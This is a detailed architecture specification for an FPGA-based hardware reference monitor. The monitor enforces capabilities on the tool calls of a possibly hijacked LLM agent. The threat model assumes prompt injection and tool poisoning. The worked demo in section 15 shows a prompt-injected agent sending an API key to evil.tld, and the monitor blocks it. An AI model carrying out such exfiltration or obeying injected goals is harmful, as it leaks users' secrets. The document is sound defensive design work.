# Redoubt — Architecture Specification (v1, detailed)

- **Date:** 2026-09-22 · **Status:** detailed draft for review · **Target:** ULX3S (ECP5-85F), RV32
- **Conventions:** XLEN = 32 (VexRiscv is 32-bit). Bit ranges are `[hi:lo]`, inclusive.
  All multi-byte on-wire fields are **little-endian** (RISC-V native) unless stated.
  `T0/T1/T2` are the trust tiers of §2.3. Citations are `[n]`, resolved in §17.

This document specifies mechanisms, not intentions: register/CSR configurations, in-memory
structures, wire formats, and the decision algorithm. Rationale is given inline; the
lineage/prior art is cited so each choice is checkable against the source.

---

## 1. Model & security property

**Principals.** `HOST` (LLM + agent + tool shims), `ENDPOINT` (T2, U-mode), `WARDEN`
(T1, S-mode microkernel), `MONITOR` (T0, M-mode reference monitor), plus the physical
`EGRESS` engines (network via ESP32, storage via microSD) and the `SECRETS` store.

**Security property (the thing we must guarantee).**
> For every execution, and for every external effect *e* performed on `EGRESS`, there
> exists a capability *c* in the **active session's** capability space such that
> `bind(c) = tool(e)`, `predicate(c)(args(e)) = true`, and `flow_ok(c, labels(e)) = true`.
> This holds for *arbitrary* behavior of `HOST`, `ENDPOINT`, and even a compromised
> `WARDEN`.

This is the classical **reference-monitor** guarantee — *complete mediation,
tamper-proof, verifiable* [1] — instantiated for the new mediated operation (a typed
tool call) and the new adversary (a hijackable agent) [2][3]. It is enforced *structurally*
(the effect is impossible without a Monitor `ecall`, because EGRESS MMIO is in an
M-only PMP region — §3), not by trusting any software above T0. This mirrors the
Keystone/Sanctorum M-mode security-monitor pattern [4][5] and Apple's "trust anchor more
privileged than the kernel" (SPTM) idea [6].

**Why deterministic-at-the-structured-boundary.** LLM reasoning is non-deterministic and
attacker-controllable, but the tool call it emits is a *structured* value (tool id + typed
args + labels). We enforce on that structure with non-AI logic, per the agent-security
literature's central finding [2][3][7]. We never adjudicate "intent."

---

## 2. Threat model

### 2.1 Adversary capabilities (assumed present)
- **A1 Full agent hijack** — arbitrary prompt/goal injection [8]; the agent issues any
  `(tool_id, args)` in any order.
- **A2 Malicious tools** — host-side tool code and MCP servers are untrusted (tool
  poisoning) [8].
- **A3 Host compromise** — arbitrary code on the host, including the USB driver.
- **A4 T2 compromise** — the ENDPOINT and egress *drivers* may be fully controlled.
- **A5 (stretch) T1 compromise** — WARDEN may be subverted; the property must still hold.

### 2.2 Explicitly out of scope (v1) — stated, not hidden
Microarchitectural/timing side channels [9]; physical/fault-injection attacks [10];
FPGA-bitstream authenticity (v2 RoT); ESP32 firmware integrity (it is in the egress path,
§9.1); agent availability/self-DoS; host-side poisoning of the agent's *own* memory;
multi-agent collusion.

### 2.3 Trust tiers
| Tier | Component | Mode | In TCB? | Trusted for |
|------|-----------|------|:------:|-------------|
| **T0** | **MONITOR** + measured-boot ROM + PMP config | M | **yes** | the security property, secrets, egress |
| T1 | **WARDEN** microkernel | S | no | liveness/scheduling only |
| T2 | ENDPOINT, egress drivers | U | no | nothing security-relevant |
| — | HOST (LLM/agent/tools) | — | no | nothing |

---

## 3. Isolation mechanism: RISC-V PMP (the load-bearing wall)

Isolation of T0 from everything else is enforced by **Physical Memory Protection**, not by
convention. PMP has up to 64 entries; on RV32 each `pmpcfg{0..15}` CSR packs **four** 8-bit
config fields and each `pmpaddr{0..63}` holds `address[33:2]` [11][12].

**pmpcfg byte layout** (per entry) [11]:
```
 bit 7   : L   (lock; when set, the rule is enforced on M-mode too and is immutable to reset)
 bit 6:5 : (reserved, 0)
 bit 4:3 : A   (0=OFF, 1=TOR top-of-range, 2=NA4, 3=NAPOT)
 bit 2   : X   (execute)   bit 1 : W (write)   bit 0 : R (read)
```

**Design choices:**
- We use **TOR** entries (`A=1`, range `[pmpaddr_{i-1}, pmpaddr_i)`) for the large,
  arbitrarily-sized regions of the memory map (no power-of-two alignment constraint) [11].
- The MONITOR itself runs in M-mode; to make M-only regions (EGRESS/SECRETS) *inaccessible
  even to a bug in M-mode software*, we require the **Smepmp** extension so a rule can be
  "enforced on non-M and denied to M" without the all-modes lock semantics [13]. Where
  Smepmp is unavailable on the chosen VexRiscv build, we fall back to `L=1` locked rules
  for the S/U-visible regions and keep EGRESS/SECRETS reachable only through the Monitor's
  own code path (still unbypassable by T1/T2). *(Open item §16.2.)*
- Entries are **written and then locked at boot** (§4) before any T1/T2 code runs; locked
  entries cannot be modified until hart reset [11], so a later T1 compromise (A5) cannot
  re-map T0.

**Region → PMP entry table (draft):**
| # | Region | Addr range (draft) | Mode R/W/X | PMP mode |
|---|--------|--------------------|-----------|----------|
| 0 | BROM (measured boot) | `0x0000_0000`–`0x0000_2000` | M:RX | TOR, lock |
| 1 | MON_CODE | `0x1000_0000`–`0x1000_8000` | M:RX | TOR, lock |
| 2 | MON_DATA (caps, policy, log) | `0x1000_8000`–`0x1002_0000` | M:RW | TOR, Smepmp/lock |
| 3 | SECRETS | `0x1002_0000`–`0x1002_4000` | M:RW; S/U:none | TOR, Smepmp |
| 4 | EGRESS_MMIO (ESP32/SD/TRNG) | `0xF000_0000`–`0xF001_0000` | M:RW; S/U:none | TOR, Smepmp |
| 5 | WARDEN | `0x2000_0000`–`0x2010_0000` | S:RWX; U:none | TOR |
| 6 | SHARED_REQ buffer | `0x4000_0000`–`0x4000_1000` | M:RW; U:RW | TOR |
| 7..n | COMPT_k (per compartment) | in SDRAM `0x8000_0000`+ | U:RW (own) | TOR/NAPOT |

If the **Sv32 MMU** is enabled in WARDEN, it provides finer per-compartment U-isolation
*on top of* PMP; PMP remains the wall around T0 regardless [12][14].

---

## 4. Boot & root of trust (v1)

1. ECP5 loads the **bitstream** from QSPI (bitstream authenticity = v2; noted §2.2).
2. Hart starts in M-mode at BROM (`0x0`). BROM computes `H = BLAKE2s-256(MON_CODE image)`
   [15] and compares to `H_expected` baked into the bitstream (a BRAM constant). Mismatch →
   halt (measured boot establishes MONITOR as the measured software root, per TEE
   attestation practice [16]).
3. MONITOR runs: it programs `pmpaddr*/pmpcfg*` for entries 0–6 per §3, sets the lock/Smepmp
   bits, initializes SECRETS and the TRNG (§9.4), and installs trap handling
   (`medeleg` does **not** delegate `ecall`-from-S/U, so they trap to M — §5.2).
4. MONITOR compiles the policy manifest (§7) into decision tables in MON_DATA and creates
   the initial session capability space (§6).
5. MONITOR `mret`s to WARDEN (S). WARDEN starts ENDPOINT and driver compartments (U).

---

## 5. The Monitor: entry ABI & decision pipeline

### 5.1 Structure
The MONITOR is `no_std` Rust with one documented `unsafe` module (CSR/PMP/MMIO). It holds:
the compiled **policy tables**, the per-session **capability spaces**, the **secret store**
handle, the **audit log** (§12), and the egress drivers' MMIO. No heap on the hot path;
all request-time state is fixed-size.

### 5.2 Entry ABI (`ecall` → M-mode)
A tool request enters via `ecall` from U (ENDPOINT) with the RISC-V calling convention
[17]:
```
a7 (x17) = REDOUBT_MEDIATE  (0x52_44_00_01)
a0 (x10) = ptr to request in SHARED_REQ   (must lie fully within region #6, else DENY_MALFORMED)
a1 (x11) = request length (bytes)
-- on return --
a0       = status  (see §5.4)
a1       = response length written into SHARED_REQ
```
`ecall`-from-U raises `mcause = 8`; the M-mode trap vector dispatches on `a7`. Any `a7`
other than the small allowed set (`REDOUBT_MEDIATE`, `REDOUBT_SESSION_*`) → `DENY_MALFORMED`.
No `ecall` exists that reads SECRETS or drives EGRESS directly; those are internal to the
performing step (§5.3.5). This is the "always invoked / no side door" property [1].

### 5.3 Decision pipeline (deterministic, bounded)
Input parsed from SHARED_REQ into a fixed `Request` (§8.3): `{session_id, req_id,
cap_handle, tool_id, args[], in_labels[]}`.

1. **Bounds/format.** Validate `ptr..ptr+len ⊆ region#6`, header magic/version, arg count
   ≤ `MAX_ARGS (8)`, total ≤ `MAX_REQ (512 B)`. Fail → `DENY_MALFORMED`.
2. **Session + capability resolution.** `session = sessions[session_id]` (bounds-checked);
   `cap = session.cspace[cap_handle]` (bounds-checked); check `cap.epoch == session.epoch`
   (revocation, §6.4). Missing/stale/wrong-type → `DENY_NO_CAP`.
3. **Tool binding.** `cap.tool_id == tool_id` else `DENY_TOOL`.
4. **Typed-argument predicate.** Evaluate `predicate_table[cap.pred_ref]` over the *typed*
   args (§7.2). Any clause false → `DENY_ARG` (reason carries the failing clause index).
5. **Information-flow.** `flow_check(flow_table[cap.flow_ref], in_labels, cap)` per §10.
   Violation → `DENY_FLOW`.
6. **Perform.** Execute the effect on the M-owned engine (§9), **injecting** any
   `cap.secret_ref` (e.g., as an HTTP header) — secret bytes never enter the response path.
   Label the result (network/file → `UNTRUSTED`).
7. **Audit + signal.** Append a hash-chained log entry (§12); on any `DENY`, drive
   OLED/LED with the reason code.

**Bounds.** Steps 1–5 are O(args × clauses) over compiled tables, `≤ MAX_ARGS × MAX_CLAUSES
(=64)` — constant-bounded, no allocation, no unbounded loops. This preserves the
"verifiable, always-terminating monitor" property.

### 5.4 Status / reason codes
```
0x00 ALLOW
0x10 DENY_NO_CAP     0x11 DENY_TOOL      0x12 DENY_ARG
0x13 DENY_FLOW       0x14 DENY_MALFORMED 0x15 DENY_REVOKED
0x20 ERR_EGRESS      0x2F ERR_INTERNAL
```

---

## 6. Capability system

Modeled on seL4's capability discipline [18][19] but deliberately **flat and fixed-size**
(no CDT graph, no untyped-retype) to keep the TCB tiny.

### 6.1 Capability entry (16 bytes, fixed — cf. seL4's 16-byte slots [18])
```
struct Cap {                      // 128 bits
  u8   ctype;      // 0=Empty 1=Net 2=File 3=Secret 4=Tool
  u8   rights;     // per-type permission bits (attenuation-only)
  u16  tool_id;    // bound tool (0 if N/A)
  u16  pred_ref;   // index into predicate_table (0xFFFF = none)
  u16  flow_ref;   // index into flow_table
  u16  secret_ref; // index into secret store (0xFFFF = none; inject-only)
  u16  aux;        // type-specific (e.g., allowlist_ref)
  u16  epoch;      // must equal session.epoch, else stale (revocation)
}
```
### 6.2 Capability space
Per session: `cspace: [Cap; N]` (v1 `N=32`), indexed by the `cap_handle` the host holds.
The handle is an opaque index; a forged/out-of-range handle resolves to `Empty` →
`DENY_NO_CAP`. (No ambient authority: a fresh cspace is all-`Empty` except what the manifest
installs.)

### 6.3 Derivation / attenuation
`cap_derive(src, narrower_pred_ref)` creates a new entry whose predicate is a **subset** of
`src`'s (checked at compile time by the manifest compiler, §7). `rights` may only clear
bits. There is **no** operation that widens authority — rights amplification is structurally
impossible.

### 6.4 Revocation
Bump `session.epoch`; all caps with the old epoch become stale in O(1) (no tree walk). A
coarser but tiny alternative to seL4's revoke-by-CDT [19]; sufficient for per-session
teardown.

### 6.5 Secrets are use-only
`ctype=Secret` / `secret_ref` permit the Monitor to *inject* a secret into an effect (§5.3.6).
No ABI returns secret bytes to T1/T2/host. (Cf. SEP key-wrapping: software gets use, not
key material [6].)

---

## 7. Policy manifest & compilation

### 7.1 Grammar (EBNF, illustrative — to finalize §16.1)
```
manifest   = "session" STRING "{" { capability } "}" ;
capability = "capability" IDENT "=" captype "{" { clause } "}" ;
captype    = "net" | "file" | "secret" | "tool" ;
clause     = "tool"   "=" STRING
           | "arg" IDENT ":" argtype "where" predicate
           | "secret" IDENT "inject-as" injsite
           | "result" "label" "=" label
           | "deny-if" flowcond ;
argtype    = "url" | "path" | "enum" | "int" | "bytes" ;
predicate  = clause_expr { ("and"|"or") clause_expr } ;      // no general computation
```
### 7.2 Compiled predicate representation
Each `arg ... where ...` compiles to a small array of **clauses**, each a
`(field_selector, op, operand_ref)` triple over the *typed* field:
```
op ∈ { EQ, IN_SET, PREFIX, SUFFIX, HOST_IN_SET, SCHEME_EQ, RANGE, LEN_LE }
```
`operand_ref` indexes an interned constant pool (allowlists, ranges) in MON_DATA. Evaluation
is a fixed loop (`≤ MAX_CLAUSES`). This is a *total* language (no loops/recursion), so the
verdict is guaranteed to terminate and is auditable — the opposite of an eval-anything
policy engine.

### 7.3 Example (compiles to the tables above)
```
session "researcher" {
  capability web = net {
    tool = "http.request"
    arg url    : url  where scheme == "https" and host in {"api.example.com"}
    arg method : enum where method in {"GET"}
    secret API_KEY inject-as header "Authorization"
    result label = UNTRUSTED
    deny-if body carries SECRET
  }
  capability corpus = file {
    tool = "file.read"
    arg path : path where prefix "/corpus/"
    result label = UNTRUSTED
  }
}   // every other tool_id → DENY_NO_CAP
```

---

## 8. Host ↔ Redoubt wire protocol

### 8.1 Transport & framing
USB CDC-ACM over the ULX3S FT231X (serial). Frames use **COBS** [20] for byte-stuffing
(zero-delimited), then within each frame:
```
Frame = len:u16 | ver:u8 | type:u8 | payload[len] | crc32:u32   (then COBS-encoded)
```
`crc32` (IEEE) over `ver..payload`; bad CRC/COBS → frame dropped, `DENY_MALFORMED` counter
incremented. ENDPOINT (T2) does framing only; it never decides.

### 8.2 TypedArg TLV
Arguments cross as *typed* values, not text (this closes the parser-mismatch bug class —
e.g., the curl `%2e` / MCP-SSRF lineage where a filter and consumer disagreed on parsing):
```
TypedArg = tag:u8 | len:u16 | value[len]
tag: 0x01 URL   0x02 PATH  0x03 ENUM  0x04 INT(le64)  0x05 BYTES  0x06 LABELSET
URL value = { scheme:enum8, host:pstr, port:u16, path:pstr }   // pre-parsed on host, re-validated by Monitor
```
The Monitor **re-derives** the security-relevant fields from the structured form rather than
trusting host-side parsing.

### 8.3 Request / Response
```
Request  = magic:u32('RDBT') | session_id:u16 | req_id:u16 | cap_handle:u16
         | tool_id:u16 | n_args:u8 | args:TypedArg[n_args] | n_labels:u8 | in_labels:u8[]
Response = req_id:u16 | status:u8 (§5.4) | n_labels:u8 | out_labels:u8[] | result:BYTES?
```

---

## 9. Egress subsystem (owned by the Monitor)

### 9.1 Network (ESP32)
ESP32 is reached over an M-owned UART/SPI link inside EGRESS_MMIO (region #4). U-mode net
drivers may format payloads in a COMPT region, but the **send** is a Monitor action that
applies the `Net` cap check and injects secrets. *Honest caveat:* the ESP32 firmware is in
the egress path (a closed module); v2 moves to wired Ethernet (ECPIX-5/Colorlight) so the
Monitor owns the MAC directly.

### 9.2 Storage (microSD)
LiteSDCard controller MMIO in region #4; block I/O gated by `File` caps (path-prefix +
mode). A minimal FS index lives in MON_DATA; file *contents* returned to callers are labeled
`UNTRUSTED`.

### 9.3 Secret store
Keys in SECRETS (region #3), loaded at boot from an M-only QSPI area. Only `inject-as`
operations expose them into an effect (§6.5).

### 9.4 TRNG
Ring-oscillator entropy source in fabric, feeding capability-handle randomization/session
keys. Continuous health tests per **NIST SP 800-90B** (Repetition-Count + Adaptive-Proportion)
[21]; on failure, entropy-consuming ops block. (Baochip likewise treats the TRNG as a
first-class isolated element [22].)

---

## 10. Information-flow control (v1, boundary-scoped)

A minimal **Denning-style lattice** [23], tracked at the mediation boundary:
- Confidentiality `C: PUBLIC ⊑ SECRET`; Integrity `I: UNTRUSTED ⊑ TRUSTED`.
- Label = 2 bits `(C,I)` carried per TypedArg / per result (`in_labels`, `out_labels`).

**Rules (enforced in step 5):**
- **No secret exfil:** a value with `C=SECRET` may enter an effect only if the cap's
  `flow_rule` clears that sink (e.g., a specific host); never a `PUBLIC` network sink.
  (`deny-if body carries SECRET`.)
- **Hostile-input marking:** egress results are labeled `I=UNTRUSTED`, propagating to the
  host so downstream consumers treat them as attacker-controlled.
- **Declassification only via capability:** lowering `C` requires a cap explicitly granting
  it — no implicit declassification (cf. DIFC in HiStar/Flume [24][25]).

**Honest scope.** Redoubt sees only what crosses the boundary; it does **not** track flows
*inside* the host LLM. It therefore enforces *boundary* IFC (what enters/leaves via tool
calls), which is the deterministic, checkable part. Full end-to-end IFC through the agent's
reasoning is explicitly **not** claimed.

---

## 11. SoC (LiteX / VexRiscv on ULX3S)

- **CPU:** VexRiscv (SpinalHDL) [14] with plugins: `IBusCachedPlugin`, `DBusCachedPlugin`,
  `CsrPlugin` (M/S/U), `PmpPlugin` (≥ 8 entries), optional `MmuPlugin` (Sv32),
  `MulDivPlugin`, `ExternalInterruptPlugin`. Config target: `RV32IMAC`, M/S/U, PMP on.
- **SoC:** LiteX [26]; peripherals: LiteDRAM (32 MB SDRAM), UART (USB-serial + debug),
  LiteSDCard (microSD), QSPI flash, GPIO/LED, SPI (SSD1331 OLED), UART/SPI→ESP32, RO-TRNG.
  CSR bus (Wishbone/AXI-lite) hosts peripheral registers within EGRESS_MMIO.
- **Memory map:** per §3 table. SDRAM at `0x8000_0000` holds WARDEN heap + compartments.
- **Toolchain:** yosys + nextpnr-ecp5 + prjtrellis (bitstream); riscv32 GCC/LLVM (firmware);
  openFPGALoader (flash); Verilator (pre-silicon sim).

---

## 12. Audit log (tamper-evident)
Append-only ring in MON_DATA. Each entry:
```
Entry = seq:u32 | ts:u32 | session_id:u16 | tool_id:u16 | status:u8 | arg_digest:blake2s128 | prev_hash:blake2s256
h_i = BLAKE2s-256(prev_hash=h_{i-1} || entry_fields)   // hash chain [15]
```
The head hash `h_n` can be exported (e.g., to the OLED / over USB) so an external verifier
detects truncation/tampering. Sized within the TCB budget (§13).

---

## 13. TCB definition & budget
**TCB (T0) = MONITOR + measured-boot ROM + PMP configuration.** Excluded: WARDEN,
compartments, host stack, ESP32, peripheral drivers not on the decision path.
- **Budget:** MONITOR ≤ **2,500** LoC `no_std` Rust; BROM ≤ **300** LoC. CI computes
  (`tokei`) and *fails the build* over budget; README publishes the current number.
- **Why:** the claim is "a trust base small enough to audit," measured against Linux/Qubes
  (millions) and seL4's ~8.7k C verified kernel [18]. Small TCB is the deliverable.

---

## 14. Security analysis
- **Complete mediation (property §1):** every egress effect requires touching EGRESS_MMIO,
  which is M-only (PMP entries #3,#4 locked at boot before T1/T2 run, §3–4). The only path
  into M is the `ecall` ABI (§5.2), which runs steps 1–6. Therefore no effect bypasses the
  checks — even under A4/A5. ∎ (sketch; a small formal model is future work, §16.)
- **Secret confidentiality:** SECRETS is M-only; no ABI returns secret bytes (§6.5). A
  hijacked agent that requests exfil is stopped at step 4 (`DENY_ARG`) or step 5
  (`DENY_FLOW`) — the §15 demo.
- **OWASP Agentic Top-10 [8] (v1 honest coverage):** ASI01 goal-hijack → *contained*;
  tool poisoning/misuse → *mitigated* (predicate + binding + no ambient authority);
  data exfiltration → *mitigated* (allowlist + IFC); privilege abuse → *mitigated* (least
  privilege). **Not covered:** side channels [9], physical [10], host-side memory poisoning,
  multi-agent collusion, availability.

## 15. Worked lifecycle (the demo)
**Attack:** host agent, prompt-injected, calls
`http.request(POST, https://evil.tld, body=API_KEY)` with `cap=web`.
Pipeline: resolve `web` ✓ → tool ✓ → predicate `host in {api.example.com}` **false** →
`DENY_ARG` (clause 0). Had it used `api.example.com` with the secret in the body, step 5
`deny-if body carries SECRET` → `DENY_FLOW`. **The key never left; OLED shows `DENY_ARG`;
audit head-hash advances.** Fully-compromised agent, zero authority gained.

## 16. Open questions
1. Finalize manifest grammar + the compiled predicate/flow table binary format.
2. Smepmp availability in the chosen VexRiscv build vs. the `L=1` fallback (§3).
3. MMU (Sv32) on for v1 multi-compartment isolation, or PMP-only first?
4. Exact TypedArg set + URL/path canonicalization rules the Monitor re-derives (§8.2).
5. ESP32 link protocol; how much is M-owned vs. a U-driver (§9.1).

## 17. References
1. J. P. Anderson, *Computer Security Technology Planning Study* (reference-monitor: complete mediation, tamperproof, verifiable), 1972. https://csrc.nist.gov/publications/history/ande72.pdf
2. *Progent: Securing AI Agents with Privilege Control.* arXiv:2504.11703. https://arxiv.org/pdf/2504.11703
3. *Securing AI Agents with Information-Flow Control.* arXiv:2505.23643. https://arxiv.org/pdf/2505.23643
4. D. Lee et al., *Keystone: An Open Framework for Architecting TEEs.* arXiv:1907.10119. https://arxiv.org/pdf/1907.10119 · SM docs: http://docs.keystone-enclave.org/en/latest/Security-Monitor/
5. *Sanctorum: A lightweight security monitor for secure enclaves.* arXiv:1812.10605. https://arxiv.org/pdf/1812.10605
6. Apple *Platform Security* (SEP, key wrapping) & SPTM deep-dive arXiv:2510.09272. https://support.apple.com/guide/security/ · https://arxiv.org/abs/2510.09272
7. *ActPlane: Programmable OS-Level Policy Enforcement for Agent Harnesses.* arXiv:2606.25189. https://arxiv.org/pdf/2606.25189
8. OWASP *Top 10 for Agentic Applications 2026.* https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
9. seL4 confidentiality vs. Spectre — NSF Formal-Methods-for-Security report. https://arxiv.org/pdf/1608.00678
10. *Bypassing Isolated Execution on RISC-V with Fault Injection.* eprint 2020/1193. https://eprint.iacr.org/2020/1193.pdf
11. RISC-V *Privileged ISA* — PMP (pmpcfg/pmpaddr, TOR/NAPOT, L bit). https://docs.openhwgroup.org/projects/cva6-user-manual/06_cv64a6_mmu/riscv/priv.html
12. *Verifying RISC-V Physical Memory Protection.* arXiv:2211.02179. https://arxiv.org/pdf/2211.02179
13. RISC-V *Smepmp* extension v1.0. https://docs.riscv.org/reference/isa/priv/smepmp.html
14. VexRiscv (SpinalHDL) — PmpPlugin/MmuPlugin/CsrPlugin. https://github.com/SpinalHDL/VexRiscv
15. M-J. Saarinen, N. Aumasson, *BLAKE2* (RFC 7693). https://www.rfc-editor.org/rfc/rfc7693
16. *Attestation Mechanisms for TEEs Demystified.* arXiv:2206.03780. https://arxiv.org/pdf/2206.03780
17. RISC-V *Calling Convention* (ecall / a0–a7). https://github.com/riscv-non-isa/riscv-elf-psabi-doc
18. *seL4 Reference Manual* (CNode/CSpace, 16-byte slots, capabilities). https://sel4.systems/Info/Docs/seL4-manual-latest.pdf
19. *seL4 Capability System* (derivation tree, revoke). https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/workshops/pdfs/20160423-sel4-capabilities.pdf
20. S. Cheshire, M. Baker, *Consistent Overhead Byte Stuffing (COBS).* https://www.stuartcheshire.org/papers/COBSforToN.pdf
21. NIST *SP 800-90B* (entropy source health tests: RCT/APT). https://csrc.nist.gov/pubs/sp/800/90/b/final
22. bunnie, *Baochip-1x* (TRNG/secure elements, "mostly-open"). https://www.bunniestudios.com/blog/2026/baochip-1x-a-mostly-open-22nm-soc-for-high-assurance-applications/
23. D. E. Denning, *A Lattice Model of Secure Information Flow*, CACM 1976. https://dl.acm.org/doi/10.1145/360051.360056
24. *HiStar / Making Information Flow Explicit* (DIFC OS). https://www.scs.stanford.edu/~nickolai/papers/zeldovich-histar.pdf
25. *Flume: Information Flow Control for Standard OS Abstractions.* https://pdos.csail.mit.edu/papers/flume-sosp07.pdf
26. LiteX SoC builder. https://github.com/enjoy-digital/litex
